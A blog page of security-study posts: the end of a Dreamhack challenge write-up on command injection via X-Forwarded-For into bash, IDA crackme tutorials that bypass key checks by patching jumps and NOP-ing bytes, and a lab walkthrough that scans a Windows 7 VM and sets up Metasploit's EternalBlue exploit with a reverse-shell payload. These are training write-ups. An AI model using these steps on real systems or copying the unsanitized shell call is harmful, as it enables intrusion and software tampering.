<li>If <strong><code>request.access_route</code></strong> can be accessed, then <strong><code>request.access_route[0]</code></strong> will be the user’s original IP address</li>
<li>If <strong><code>request.access_route</code></strong> cannot be accessed, <strong><code>request.remote_addr</code></strong> will be used to obtain the user’s IP address, which is another method provided by Flask</li>
<li>The <strong><code>X-Forwarded-For</code></strong> header is usually used when a user’s request goes through a proxy server. The proxy server usually adds the user’s original IP address to the **<code>X-Forwarded-For</code>* header. * header so that the backend server can know the true source of the request</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	result = run(</span><br><span class="line">		[<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">f&quot;echo <span class="subst">&#123;user_ip&#125;</span>&quot;</span>],</span><br><span class="line">		capture_output=<span class="literal">True</span>,</span><br><span class="line">		text=<span class="literal">True</span>,</span><br><span class="line">		timeout=<span class="number">3</span>,</span><br><span class="line">	)</span><br></pre></td></tr></table></figure>

<p>This program does not verify user_ip and may be able to inject it</p>
<p>For requests with nginx reverse proxy, you need to add the following content to the nginx configuration:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>X-Forwarded-For</code> is used to identify the source of HTTP requests</li>
<li>This is not required if the client connects directly to the server</li>
<li>If the client HTTP connection goes through an intermediary such as a proxy server or load balancer, the server will only have the IP address of the device that most recently forwarded the message</li>
<li>Used to identify the original IP address of a client connecting to a web server through a proxy server</li>
<li><strong>Default http request <code>X-Forwarded-For</code> does not contain header</strong></li>
</ul>
<p>You can add a line X-Forwarded-For after burp interception</p>
<p><img src="/img/Dreamhack1_46.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_47.png" alt="Untitled"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Crackme2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Crackme2/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.079Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Crackme2/">
        IDA - Crack me2
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Crack-me2"><a href="#Crack-me2" class="headerlink" title="Crack me2"></a>Crack me2</h1><p>使用IDA進行反編譯及創建結構</p>
<p>執行檔案看看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remnux@remnux:~/Documents/crackme (1)/crackme$ ./crackme2</span><br><span class="line">enter key:dde</span><br><span class="line">enter serial:</span><br><span class="line">Wrong</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>原始碼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">struct Keybank &#123;</span><br><span class="line"></span><br><span class="line">	int key;</span><br><span class="line">	int serial;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">success</span></span>()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nCorrect\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">fail</span></span>()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWrong\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">	int key = 0;</span><br><span class="line">	int serial = 0;</span><br><span class="line"></span><br><span class="line">	struct Keybank kb;</span><br><span class="line"></span><br><span class="line">  kb.key = 1337;</span><br><span class="line">	kb.serial = 1;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter key:&quot;</span>);</span><br><span class="line">	scanf(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter serial:&quot;</span>);</span><br><span class="line">	scanf(<span class="string">&quot;%d&quot;</span>, &amp;serial);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( key == kb.key &amp;&amp; serial == kb.serial) success();</span><br><span class="line">	<span class="keyword">else</span> fail();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>開啟IDA並反編譯</p>
<p>View &gt; Open subviews&gt;Generate pseudocode</p>
<p>快捷鍵 <code>F5</code> </p>
<p><img src="/img/revcra2_Untitled.png" alt="Untitled"></p>
<p>可以通過重新命名讓程式比較容易理解</p>
<p>比如這邊是要求用戶輸入key → v4</p>
<ul>
<li>按 <code>n</code> 重命名</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br></pre></td></tr></table></figure>

<p><img src="/img/revcra2_Untitled_1.png" alt="Untitled"></p>
<p>另一個v5也通過n命名成serial</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br></pre></td></tr></table></figure>

<p>v6 、 v7 是結構，進入結構創建一個新的結構</p>
<p><img src="/img/revcra2_Untitled_2.png" alt="Untitled"></p>
<p>fn+ins 或是右鍵選擇Add struct.. &gt; 命名 keybank</p>
<p><img src="/img/revcra2_Untitled_3.png" alt="Untitled"></p>
<p><img src="/img/revcra2_Untitled_4.png" alt="Untitled"></p>
<p>再來插入兩個成員及兩個欄位，並命名變數名稱，對欄位按 n</p>
<p><img src="/img/revcra2_Untitled_5.png" alt="Untitled"></p>
<p>按兩次 <code>d</code> 才是 4 bytes</p>
<ul>
<li>int → 4 bytes</li>
<li>double → 8 bytes</li>
<li>char → 1 bytes</li>
</ul>
<p><img src="/img/revcra2_Untitled_6.png" alt="Untitled"></p>
<p>把這結構加到C程式中</p>
<p>對 <code>v6</code> 按 <code>y</code> 並取名前面命名的struct的名稱&gt; set the type</p>
<p><img src="/img/revcra2_Untitled_7.png" alt="Untitled"></p>
<p><img src="/img/revcra2_Untitled_8.png" alt="Untitled"></p>
<p><img src="/img/revcra2_Untitled_9.png" alt="Untitled"></p>
<p>重新命名v6 &gt; Keybank</p>
<p><img src="/img/revcra2_Untitled_10.png" alt="Untitled"></p>
<p><img src="/img/revcra2_Untitled_11.png" alt="Untitled"></p>
<ul>
<li>修改變數名稱使程式更易讀</li>
<li>進行分析時知道更多訊息，隨時可以修改變數名稱</li>
</ul>
<p>如果想把這邊的程式視圖與反彙編視圖同步</p>
<p>右鍵&gt;Synchrinize..&gt;IDA VIew A…</p>
<p>通過點擊程式碼的位置可以注意到跟視圖的位置是同步的，綠色區塊</p>
<p><img src="/img/revcra2_Untitled_12.png" alt="Untitled"></p>
<p>也可以雙擊凾式看到裡面的反編譯後的程式碼</p>
<p><img src="/img/revcra2_Untitled_13.png" alt="Untitled"></p>
<p><img src="/img/revcra2_Untitled_14.png" alt="Untitled"></p>
<p><img src="/img/revcra2_Untitled_15.png" alt="Untitled"></p>
<p>可以併排停靠在一個視窗中，比較方便查看</p>
<p>到視圖中F5反編譯程式碼後，將反編譯的視窗拖曳到主視圖的右側位置</p>
<p><img src="/img/revcra2_Untitled_16.png" alt="Untitled"></p>
<p>這樣是最快瀏覽及對照程式運行過程的方式</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Crackme" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Crackme/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.079Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Crackme/">
        IDA - Crack me1
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Crack-me"><a href="#Crack-me" class="headerlink" title="Crack me"></a>Crack me</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remnux@remnux:~/Documents/crackme$ ./crackme1</span><br><span class="line">enter key:dwdwdwd</span><br><span class="line"></span><br><span class="line">sorry</span><br><span class="line"></span><br><span class="line">remnux@remnux:~/Documents/crackme$ ./crackme1</span><br><span class="line">enter key:2337</span><br><span class="line"></span><br><span class="line">congrats</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\ncongrats\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nsorry\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;enter key:&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(key == <span class="number">2337</span>) success();</span><br><span class="line">        <span class="keyword">else</span> fail();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;                                                                                               </span><br></pre></td></tr></table></figure>

<p><img src="/img/revcra1_Untitled.png" alt="Untitled"></p>
<p><img src="/img/revcra1_Untitled_1.png" alt="Untitled"></p>
<p>逐步完成這過程， <code>F2</code> 放置斷點</p>
<p>或是Debugger &gt; Breakpoints &gt; Add breakpoint</p>
<p><img src="/img/revcra1_Untitled_2.png" alt="Untitled"></p>
<p>在執行debugger後，會看到terminal跳出enter key:</p>
<p>先隨便輸入</p>
<p><img src="/img/revcra1_Untitled_3.png" alt="Untitled"></p>
<p>右側綠色箭頭會開始閃爍，如果輸入不是2337會走到右邊，並調用fail function</p>
<ul>
<li>2337-2337&#x3D;0才往左跑</li>
</ul>
<p><img src="/img/revcra1_Untitled_4.png" alt="Untitled"></p>
<p>目前狀況是會往右走call fail function，想讓它變成call success</p>
<p><img src="/img/revcra1_Untitled_5.png" alt="Untitled"></p>
<p><img src="/img/revcra1_Untitled_6.png" alt="Untitled"></p>
<p>改變jnz，因為預設是跑fail function</p>
<ul>
<li>Edit &gt; Patch program &gt;　Assemble…</li>
<li>jnz → jz</li>
</ul>
<p><img src="/img/revcra1_Untitled_7.png" alt="Untitled"></p>
<p><img src="/img/revcra1_Untitled_8.png" alt="Untitled"></p>
<p>這邊順便談談 jmp &#x2F; jz &#x2F; jnz &#x2F; je &#x2F; jne 這些跳轉指令</p>
<ul>
<li>JMP：無條件跳轉。</li>
<li>JE &#x2F; JZ：如果相等或者為零，則跳轉。</li>
<li>JNE &#x2F; JNZ：如果不相等或者不為零，則跳轉。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">            +------(<span class="keyword">if</span> A == B)------+</span><br><span class="line">            |                       |</span><br><span class="line">           JMP                     JMP</span><br><span class="line">            |                       |</span><br><span class="line">  +-----(<span class="keyword">if</span> C == D)------+          |</span><br><span class="line">  |         |            |          |</span><br><span class="line"> JE        JNE           JZ        JNZ</span><br><span class="line">  |         |            |          |</span><br><span class="line">(<span class="literal">true</span>)    (<span class="literal">true</span>)       (<span class="literal">true</span>)     (<span class="literal">true</span>)</span><br><span class="line">  |         |            |          |</span><br><span class="line"> ...       ...          ...        ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再來按F8 步進，記得要在運行程式的狀況下才能進行這動作</p>
<p><img src="/img/revcra1_Untitled_9.png" alt="Untitled"></p>
<p>會看到他跳到了左側，按到call success function會看到跳出訊息</p>
<p><img src="/img/revcra1_Untitled_10.png" alt="Untitled"></p>
<p><img src="/img/revcra1_Untitled_11.png" alt="Untitled"></p>
<p>按F9繼續執行</p>
<p>建立文件備份</p>
<p>Edit &gt;Patch program &gt;apply patch to input file…</p>
<ul>
<li>勾取 Create backup</li>
<li>會生成.bak</li>
</ul>
<p><img src="/img/revcra1_Untitled_12.png" alt="Untitled"></p>
<p>再次運行執行檔，會看到他已被修復</p>
<ul>
<li>隨便輸入就可以得到congrats</li>
</ul>
<p><img src="/img/revcra1_Untitled_13.png" alt="Untitled"></p>
<hr>
<p>另一種竄改執行的方式</p>
<p>將前面的ida關閉時不保存任何檔案，並刪除除了.bak及c檔的所有檔案</p>
<p>刪除.bak檔案的附檔名，重新開啟ida將檔案引入</p>
<p>記得給予檔案執行權限，debug才不會出現權限錯誤</p>
<p>這次換再跳轉前下斷點並運行debug</p>
<p><img src="/img/revcra1_Untitled_14.png" alt="Untitled"></p>
<p><img src="/img/revcra1_Untitled_15.png" alt="Untitled"></p>
<p>執行流程依舊是eax - 921h &#x3D;0 才跳轉到success，可以透過修改暫存器的值，16進制的值</p>
<p><img src="/img/revcra1_Untitled_16.png" alt="Untitled"></p>
<p>→ 0x0000000000000000 → 0x0000000000000<strong>921</strong></p>
<p>運行F8步進過去</p>
<ul>
<li><code>F8</code> 會直接運行到下個指令，不進入function</li>
<li><code>F7</code> 會深入到function中一步步運行指令</li>
</ul>
<p><img src="/img/revcra1_Untitled_17.png" alt="Untitled"></p>
<p>成功執行到success</p>
<p><img src="/img/revcra1_Untitled_18.png" alt="Untitled"></p>
<hr>
<p>第三種方式 刪除指令本身執行</p>
<p>需要計算需要再不進行任何操作的情況下替換多少位元組</p>
<ul>
<li>each nop &#x3D; 1</li>
<li>byte, i.e. 0x90</li>
</ul>
<p>設定並查看位元組</p>
<p>Option&gt;General</p>
<p><img src="/img/revcra1_Untitled_19.png" alt="Untitled"></p>
<p>mov eax後面跟著位址值，這位址占用三個位元組(8B 45 F4)</p>
<p><img src="/img/revcra1_Untitled_20.png" alt="Untitled"></p>
<p>暫時停用該區塊的指令執行，而不需要修改原始指令</p>
<p>Edit&gt;Patch Program&gt;Change byte</p>
<ul>
<li>8B 45 F4 3D 21 09 00 00 75 0C B8 00 00 00 00 E8  -&gt; <strong>90 90 90</strong> 3D 21 09 00 00 75 0C B8 00 00 00 00 E8</li>
</ul>
<p><img src="/img/revcra1_Untitled_21.png" alt="Untitled"></p>
<p>將指令由**<code>8B 45 F4</code><strong>改為</strong><code>90 90 90</code><strong>的目的是將原本的指令替換為</strong>NOP（No Operation）**指令，也就是空操作指令</p>
<ul>
<li>NOP指令不會對處理器的狀態或者暫存器的內容進行任何改變，它只是<strong>消耗處理器的時間，但不會有任何實際的作用</strong></li>
<li>通過替換指令為NOP來忽略某些部分的執行，以方便測試或者分析程式的行為</li>
<li>**<code>90</code><strong>是NOP指令的機器碼表示。所以將指令替換為三個</strong><code>90</code>**，就相當於執行了三次NOP，從而將原本的指令暫時禁用</li>
</ul>
<p><img src="/img/revcra1_Untitled_22.png" alt="Untitled"></p>
<p>如果不希望這部分指令發生可以利用這方式</p>
<ul>
<li>位元數必須相同，不然可能蓋到其他指令</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="privilege-Capstone-Privilege" class="article article-type-privilege" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Capstone-Privilege/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.077Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Capstone-Privilege/">
        Privilege Escalation
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Capstone-Privilege-Escalation"><a href="#Capstone-Privilege-Escalation" class="headerlink" title="Capstone - Privilege Escalation"></a>Capstone - Privilege Escalation</h1><p>Resources:</p>
<p><a target="_blank" rel="noopener" href="https://drive.google.com/drive/folders/1xJy4ozXaahXvjbgTeJVWyY-eUGIKgCj1?usp=sharing"><strong>Capstone VMs</strong></a></p>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=JZN3JhoAdWo&list=PLLKT__MCUeiyxF54dBIkzEXT7h8NgqQUB&ab_channel=TheCyberMentor">Old Capstone Videos</a></p>
<p><a target="_blank" rel="noopener" href="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners">Windows Privilege Escalation for Beginners</a></p>
<p><a target="_blank" rel="noopener" href="https://academy.tcm-sec.com/p/linux-privilege-escalation">Linux Privilege Escalation for Beginners</a></p>
<p><a target="_blank" rel="noopener" href="https://cdn.fs.teachablecdn.com/XyWGk3BwRMWhth526GV0">**https://cdn.fs.teachablecdn.com/XyWGk3BwRMWhth526GV0</a>** </p>
<hr>
<p>權限提升 - 提升原使用者權限</p>
<h3 id="Set-up-Blue-VM"><a href="#Set-up-Blue-VM" class="headerlink" title="Set up Blue VM"></a>Set up Blue VM</h3><ul>
<li>user - Password123!</li>
<li>administrator - Password456!</li>
<li>win7</li>
<li>192.168.19.139</li>
</ul>
<p>確認kali可以連線到這台機器</p>
<h3 id="Walkthrough-Blue"><a href="#Walkthrough-Blue" class="headerlink" title="Walkthrough - Blue"></a><strong>Walkthrough - Blue</strong></h3><p>按照慣例先掃描目標機器的服務</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nmap -T4 -A -p- 192.168.19.139**</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 21:11 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.139</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65526 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">**135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC**</span><br><span class="line">MAC Address: 00:0C:29:B9:88:D6 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: **Microsoft Windows 7|2008|8.1**</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1</span><br><span class="line">OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">**Service Info: Host: WIN-845Q99OO4PP;** OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| **smb-os-discovery:** </span><br><span class="line">|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1</span><br><span class="line">|   Computer name: WIN-845Q99OO4PP</span><br><span class="line">|   NetBIOS computer name: WIN-845Q99OO4PP\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System <span class="keyword">time</span>: 2024-02-14T21:12:23-05:00</span><br><span class="line">| **smb2-security-mode:** </span><br><span class="line">|   2:1:0: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| **smb-security-mode:** </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-02-15T02:12:23</span><br><span class="line">|_  start_date: 2024-02-14T02:35:29</span><br><span class="line">|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:b9:88:d6 (VMware)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.28 ms 192.168.19.139</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 86.12 seconds</span><br></pre></td></tr></table></figure>

<p>從掃描結果看到不少重要資訊</p>
<ul>
<li><strong>139&#x2F;tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</strong></li>
<li><strong>445&#x2F;tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</strong></li>
<li><strong>Service Info: Host: WIN-845Q99OO4PP</strong></li>
<li>Running: <strong>Microsoft Windows 7|2008|8.1</strong></li>
</ul>
<p>到google搜尋 <strong>microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds</strong> 相關版本漏洞</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47176">https://www.exploit-db.com/exploits/47176</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit">https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/d4t4s3c/Win7Blue">https://github.com/d4t4s3c/Win7Blue</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://gist.github.com/05t3/7d5925e6a4585abe2a48cc4a978aea87">https://gist.github.com/05t3/7d5925e6a4585abe2a48cc4a978aea87</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/eternalblue_exploit10.py">https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/eternalblue_exploit10.py</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit/blob/master/eternalblue_doublepulsar.rb">https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit/blob/master/eternalblue_doublepulsar.rb</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/42315"><strong>https://www.exploit-db.com/exploits/42315</strong></a></p>
<ul>
<li>通常主要以可以進行遠程控制的payload為主</li>
<li>提到EternalBlue，開啟MSF搜尋一下exploit</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search eternalblue</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   **3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection**</span><br><span class="line">   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>auxiliary modules &gt; check、attack、scanning…</strong></li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msf6 &gt; **use 3**</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **options** </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                     Required  Description</span><br><span class="line">   ----         ---------------                     --------  -----------</span><br><span class="line">   CHECK_ARCH   <span class="literal">true</span>                                no        Check <span class="keyword">for</span> architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   <span class="literal">true</span>                                no        Check <span class="keyword">for</span> DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   <span class="literal">false</span>                               no        Check <span class="keyword">for</span> named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/da  <span class="built_in">yes</span>       List of named pipes to check</span><br><span class="line">                ta/wordlists/named_pipes.txt</span><br><span class="line">   RHOSTS                                           <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using</span><br><span class="line">                                                              -metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT        445                                 <span class="built_in">yes</span>       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                   no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                          no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                          no        The username to authenticate as</span><br><span class="line">   THREADS      1                                   <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **<span class="built_in">set</span> rhost 192.168.19.139**</span><br><span class="line">rhost =&gt; 192.168.19.139</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **run**</span><br><span class="line"></span><br><span class="line">[+] 192.168.19.139:445    - Host is likely **VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)**</span><br><span class="line">[*] 192.168.19.139:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<ul>
<li>可以確認目標機器是有RCE漏洞的，對它進行利用</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **search eternalblue**</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection</span><br><span class="line">   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; **use 0**</span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; options </span><br><span class="line"></span><br><span class="line">Module options 